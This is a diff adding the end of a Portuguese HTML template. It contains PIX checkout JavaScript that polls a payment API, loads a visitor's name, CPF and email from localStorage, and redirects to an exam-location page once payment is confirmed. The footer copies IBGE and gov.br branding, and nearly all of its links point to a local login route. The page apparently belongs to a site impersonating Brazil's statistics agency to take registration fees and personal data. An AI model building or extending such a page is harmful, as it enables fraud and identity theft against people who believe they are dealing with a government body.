+                    btn.innerHTML = originalText;
+                    btn.classList.remove('bg-green-700');
+                    btn.classList.add('bg-[#0B2341]', 'hover:bg-[#184A8C]');
+                }, 2000);
+            });
+        }
+
+        // Função para verificar status do pagamento
+        async function verificarPagamento() {
+            if (!pixData || !pixData.payment_id) {
+                console.log('Dados PIX não disponíveis para verificação');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/verificar-pagamento', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        payment_id: pixData.payment_id
+                    })
+                });
+
+                const data = await response.json();
+                console.log('Status da verificação:', data);
+
+                if (data.success) {
+                    const status = data.status;
+
+                    // Status que indicam pagamento aprovado na For4Payments
+                    if (status === 'paid' || status === 'approved' || status === 'completed' || 
+                        status === 'PAID' || status === 'APPROVED' || status === 'COMPLETED') {
+
+                        // Pagamento confirmado
+                        document.getElementById('payment-status').innerHTML = `
+                            <div class="flex items-center">
+                                <div class="w-3 h-3 bg-green-600 rounded-full mr-3"></div>
+                                <span class="text-sm font-medium text-gray-700 uppercase tracking-wide">PAGAMENTO CONFIRMADO</span>
+                            </div>
+                        `;
+                        document.getElementById('payment-status').className = 'border border-green-300 bg-green-50 p-4';
+
+                        // Parar verificação automática
+                        if (paymentCheckInterval) {
+                            clearInterval(paymentCheckInterval);
+                        }
+
+                        // Redirecionar após alguns segundos
+                        setTimeout(() => {
+                            alert('Pagamento confirmado! Sua inscrição foi finalizada com sucesso.');
+                            window.location.href = '/selecao-local-prova';
+                        }, 3000);
+
+                    } else if (status === 'failed' || status === 'cancelled' || status === 'expired' ||
+                               status === 'FAILED' || status === 'CANCELLED' || status === 'EXPIRED') {
+
+                        // Pagamento falhou
+                        document.getElementById('payment-status').innerHTML = `
+                            <div class="flex items-center">
+                                <div class="w-3 h-3 bg-red-600 rounded-full mr-3"></div>
+                                <span class="text-sm font-medium text-gray-700 uppercase tracking-wide">PAGAMENTO FALHOU</span>
+                            </div>
+                        `;
+                        document.getElementById('payment-status').className = 'border border-red-300 bg-red-50 p-4';
+
+                        // Parar verificação automática
+                        if (paymentCheckInterval) {
+                            clearInterval(paymentCheckInterval);
+                        }
+
+                    } else {
+                        // Status pendente (PENDING, waiting_payment, etc.)
+                        console.log(`Pagamento ainda pendente. Status: ${status}`);
+
+                        // Atualizar display de status pendente
+                        document.getElementById('payment-status').innerHTML = `
+                            <div class="flex items-center">
+                                <div class="w-3 h-3 bg-yellow-500 rounded-full mr-3 animate-pulse"></div>
+                                <span class="text-sm font-medium text-gray-700 uppercase tracking-wide">AGUARDANDO PAGAMENTO</span>
+                            </div>
+                        `;
+                    }
+                } else {
+                    console.error('Erro na verificação:', data.message);
+                }
+            } catch (error) {
+                console.error('Erro ao verificar pagamento:', error);
+            }
+        }
+
+        // Função para iniciar verificação automática de pagamento
+        function iniciarVerificacaoPagamento(paymentId) {
+            paymentCheckInterval = setInterval(() => {
+                verificarPagamento();
+            }, 5000); // Verificar a cada 5 segundos
+        }
+
+        // Initialize language selector dropdown functionality
+        function initializeLanguageSelector() {
+            const languageSelector = document.getElementById('language-selector');
+            const languageDropdown = document.getElementById('language-dropdown');
+            const languageChevron = document.getElementById('language-chevron');
+
+            if (!languageSelector || !languageDropdown || !languageChevron) return;
+
+            function toggleLanguageDropdown() {
+                const isHidden = languageDropdown.classList.contains('hidden');
+                if (isHidden) {
+                    openLanguageDropdown();
+                } else {
+                    closeLanguageDropdown();
+                }
+            }
+
+            function openLanguageDropdown() {
+                languageDropdown.classList.remove('hidden');
+                languageChevron.style.transform = 'rotate(180deg)';
+            }
+
+            function closeLanguageDropdown() {
+                languageDropdown.classList.add('hidden');
+                languageChevron.style.transform = 'rotate(0deg)';
+            }
+
+            // Toggle on click
+            languageSelector.addEventListener('click', function(e) {
+                e.stopPropagation();
+                toggleLanguageDropdown();
+            });
+
+            // Close on outside click
+            document.addEventListener('click', function(e) {
+                if (!languageDropdown.contains(e.target) && !languageSelector.contains(e.target)) {
+                    closeLanguageDropdown();
+                }
+            });
+
+            // Close on language selection
+            const languageLinks = languageDropdown.querySelectorAll('a');
+            languageLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    closeLanguageDropdown();
+                });
+            });
+        }
+
+        // Initialize footer accordion functionality
+        function initializeFooterAccordion() {
+            const accordionTriggers = document.querySelectorAll('.accordion-trigger');
+
+            accordionTriggers.forEach(trigger => {
+                trigger.addEventListener('click', function(e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('data-target');
+                    const content = document.getElementById(targetId);
+                    const chevron = this.querySelector('.accordion-chevron');
+
+                    if (content && chevron) {
+                        const isHidden = content.classList.contains('hidden');
+
+                        if (isHidden) {
+                            content.classList.remove('hidden');
+                            chevron.style.transform = 'rotate(180deg)';
+                        } else {
+                            content.classList.add('hidden');
+                            chevron.style.transform = 'rotate(0deg)';
+                        }
+                    }
+                });
+            });
+        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeLanguageSelector();
+            initializeFooterAccordion();
+            carregarDadosUsuario();
+
+            // Carregar protocolo do localStorage
+            function carregarProtocolo() {
+                const dadosCompletos = localStorage.getItem('ibge_inscricao_completa');
+                if (dadosCompletos) {
+                    try {
+                        const dados = JSON.parse(dadosCompletos);
+                        if (dados.protocolo) {
+                            const protocoloElement = document.getElementById('protocolo-checkout');
+                            if (protocoloElement) {
+                                protocoloElement.textContent = dados.protocolo;
+                            }
+                        }
+                    } catch (error) {
+                        console.error('Erro ao carregar protocolo:', error);
+                        // Manter "Carregando..." se houver erro
+                    }
+                } else {
+                    console.warn('Dados completos não encontrados no localStorage');
+                }
+            }
+
+            // Carregar protocolo
+            carregarProtocolo();
+
+            // Carregar dados do usuário imediatamente
+            const dadosCarregados = carregarDadosUsuario();
+
+            if (dadosCarregados && dadosCarregados.nome && dadosCarregados.cpf && dadosCarregados.email) {
+                console.log('[CHECKOUT] Dados válidos carregados, gerando PIX imediatamente...');
+                // Gerar PIX imediatamente se os dados estão válidos
+                setTimeout(() => gerarPIX(), 100);
+            } else {
+                console.warn('[CHECKOUT] Dados incompletos, tentando recarregar...');
+                // Tentar recarregar após um tempo maior
+                setTimeout(() => {
+                    const dadosRecarregados = carregarDadosUsuario();
+                    if (dadosRecarregados && dadosRecarregados.nome) {
+                        console.log('[CHECKOUT] Dados recarregados com sucesso, gerando PIX...');
+                        gerarPIX();
+                    } else {
+                        console.error('[CHECKOUT] Falha crítica no carregamento de dados');
+                        // Mostrar erro na interface
+                        const qrContainer = document.getElementById('qr-code-container');
+                        if (qrContainer) {
+                            qrContainer.innerHTML = `
+                                <div class="text-center text-red-600">
+                                    <div class="mb-3">
+                                        <i class="fas fa-exclamation-triangle text-4xl text-red-400"></i>
+                                    </div>
+                                    <p class="text-sm">Erro ao carregar dados do usuário</p>
+                                    <p class="text-xs mt-2">Volte à página anterior e tente novamente</p>
+                                    <button onclick="window.history.back()" class="mt-3 px-4 py-2 bg-blue-600 text-white text-xs rounded hover:bg-blue-700">
+                                        Voltar
+                                    </button>
+                                </div>
+                            `;
+                        }
+                    }
+                }, 2000);
+            }
+        });
+    </script>
+
+    <!-- Footer sem banner de cookies -->
+    <footer class="bg-[#0B2341] text-white relative" style="z-index: 10;">
+        <div class="w-full px-4 py-4">
+            <!-- MAIS INFORMAÇÕES Section -->
+            <div class="w-full border-b border-white"></div>
+            <div class="accordion-item">
+                <div class="flex items-center justify-between py-4 cursor-pointer accordion-trigger" data-target="mais-info">
+                    <a href="{{ url_for('mais_informacoes') }}" class="font-bold text-base hover:text-gray-300 transition-colors">MAIS INFORMAÇÕES</a>
+                    <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300"></i>
+                </div>
+                <div class="accordion-content hidden pb-4" id="mais-info">
+                    <ul class="space-y-2.5 text-base">
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Estatísticas de Acesso ao Site</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Pesquisa de Avaliação de Serviços</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Dados do censo 2020</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Download dos microdados</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Cartografia</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- SERVIÇOS Section -->
+            <div class="border-t border-[#bfcbe2] mt-2"></div>
+            <div class="accordion-item">
+                <div class="flex items-center justify-between py-4 cursor-pointer accordion-trigger" data-target="servicos">
+                    <a href="{{ url_for('login') }}" class="font-bold text-base tracking-tight hover:text-gray-300 transition-colors">SERVIÇOS</a>
+                    <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300"></i>
+                </div>
+                <div class="accordion-content hidden pb-4" id="servicos">
+                    <ul class="space-y-2.5 text-base">
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Certificação de Produto Estatístico</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Capacitação Acadêmica</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Mapas</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Georreferenciamento</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- CANAIS DE ATENDIMENTO Section -->
+            <div class="border-t border-[#bfcbe2] mt-2"></div>
+            <div class="accordion-item">
+                <div class="flex items-center justify-between py-4 cursor-pointer accordion-trigger" data-target="atendimento">
+                    <a href="{{ url_for('atendimento') }}" class="font-bold text-base tracking-tight hover:text-gray-300 transition-colors">CANAIS DE ATENDIMENTO</a>
+                    <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300"></i>
+                </div>
+                <div class="accordion-content hidden pb-4" id="atendimento">
+                    <ul class="space-y-2.5 text-base">
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Ouvidoria</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Fale conosco</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">IBGE Responde</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Dados Abertos</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- PRIVACIDADE Section -->
+            <div class="border-t border-[#bfcbe2] mt-2"></div>
+            <div class="accordion-item">
+                <div class="flex items-center justify-between py-4 cursor-pointer accordion-trigger" data-target="privacidade">
+                    <a href="{{ url_for('privacidade') }}" class="font-bold text-base tracking-tight hover:text-gray-300 transition-colors">PRIVACIDADE</a>
+                    <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300"></i>
+                </div>
+                <div class="accordion-content hidden pb-4" id="privacidade">
+                    <ul class="space-y-2.5 text-base">
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Política de Privacidade</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Termos de Uso</a></li>
+                        <li><a href="{{ url_for('login') }}" class="text-gray-300 hover:text-white transition-colors">Cookies</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- ÓRGÃOS DO GOVERNO Section -->
+            <div class="border-t border-[#bfcbe2] mt-2"></div>
+            <div class="py-4">
+                <a href="{{ url_for('orgaos_governo') }}" class="text-white text-base font-bold tracking-tight hover:text-gray-300 transition-colors">ÓRGÃOS DO GOVERNO</a>
+            </div>
+
+            <!-- REDES SOCIAIS Section -->
+            <div class="border-t border-[#bfcbe2] mt-2"></div>
+            <div class="py-4">
+                <span class="text-white text-base font-bold tracking-tight">REDES SOCIAIS</span>
+            </div>
+            <div class="flex items-center space-x-4 pb-4">
+                <a class="text-white text-lg hover:text-gray-300 transition-colors" href="http://www.facebook.com/ibgeoficial" target="_blank" rel="noopener" aria-label="Facebook IBGE">
+                    <i class="fab fa-facebook-f"></i>
+                </a>
+                <a class="text-white text-lg hover:text-gray-300 transition-colors" href="https://instagram.com/ibgeoficial" target="_blank" rel="noopener" aria-label="Instagram IBGE">
+                    <i class="fab fa-instagram"></i>
+                </a>
+                <a class="text-white text-lg hover:text-gray-300 transition-colors" href="https://www.tiktok.com/@ibgeoficial" target="_blank" rel="noopener" aria-label="TikTok IBGE">
+                    <i class="fab fa-tiktok"></i>
+                </a>
+                <a class="text-white text-lg hover:text-gray-300 transition-colors" href="https://twitter.com/ibgecomunica" target="_blank" rel="noopener" aria-label="Twitter IBGE">
+                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 512 512">
+                        <path d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
+                    </svg>
+                </a>
+                <a class="text-white text-lg hover:text-gray-300 transition-colors" href="https://bsky.app/profile/ibgeoficial.bsky.social" target="_blank" rel="noopener" aria-label="Bluesky IBGE">
+                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 512 512">
+                        <path d="M166.7,135.8c36.2,27.1,75.1,82.2,89.3,111.7,14.3-29.5,53.2-84.6,89.3-111.7,26.1-19.6,68.4-34.7,68.4,13.5s-5.5,80.9-8.8,92.5c-11.3,40.2-52.3,50.5-88.8,44.3,63.8,10.9,80,46.8,45,82.8-66.6,68.3-95.7-17.1-103.1-39-1.4-4-2-5.9-2-4.3,0-1.6-.6.3-2,4.3-7.5,21.9-36.6,107.3-103.1,39-35-36-18.8-71.9,45-82.8-36.5,6.2-77.5-4.1-88.8-44.3-3.2-11.6-8.8-82.9-8.8-92.5,0-48.2,42.3-33.1,68.4-13.5h0Z"/>
+                    </svg>
+                </a>
+                <a class="text-white text-lg hover:text-gray-300 transition-colors" href="http://www.youtube.com/ibgeoficial" target="_blank" rel="noopener" aria-label="YouTube IBGE">
+                    <i class="fab fa-youtube"></i>
+                </a>
+                <a class="text-white text-lg hover:text-gray-300 transition-colors" href="https://whatsapp.com/channel/0029VaoM160JJhzY98Tpge3h" target="_blank" rel="noopener" aria-label="WhatsApp IBGE">
+                    <i class="fab fa-whatsapp"></i>
+                </a>
+            </div>
+
+            <!-- Gov.br Logo -->
+            <div class="pt-5 pb-4">
+                <a href="https://www.gov.br/pt-br" target="_blank" rel="noopener">
+                    <span class="block text-white text-3xl font-bold hover:text-gray-300 transition-colors">gov.br</span>
+                </a>
+            </div>
+
+            <!-- Acesso à Informação -->
+            <div class="pt-5 pb-4 flex items-center">
+                <div class="mr-4">
+                    <a href="https://www.gov.br/acessoainformacao/pt-br" target="_blank" rel="noopener">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 117 49" class="w-32 h-14 hover:opacity-80 transition-opacity">
+                            <circle cx="22" cy="23" r="22" fill="#fff"></circle>
+                            <path style="stroke: #071d41;stroke-width:9;stroke-linecap:round;" d="m 22,23 v 13"></path>
+                            <path style="stroke:#fff;stroke-width:4;stroke-linejoin:round;" d="m 4,43 3,-6 4,3 z"></path>
+                            <circle r="4.5" cy="11" cx="22" fill="#071d41"></circle>
+                            <g fill="#fff">
+                                <text x="47" y="22" style="font: normal bold 11px Open Sans, sans-serif;">
+                                    <tspan y="18">Acesso à</tspan>
+                                    <tspan x="47" y="31">Informação</tspan>
+                                </text>
+                            </g>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Anti-Corruption Logo -->
+            <div class="pt-4 pb-8">
+                <a href="https://www.rededecontrole.gov.br/" target="_blank" rel="noopener" title="Participante do Programa Nacional de Prevenção a Corrupção">
+                    <img alt="Logo do IBGE com o texto 'Corrupção Não' em português, fundo branco, selo de combate à corrupção" 
+                         class="w-20 h-20 object-contain hover:opacity-80 transition-opacity" 
+                         src="https://www.ibge.gov.br/images/novoportal/corrupcao-nao.png"/>
+                </a>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
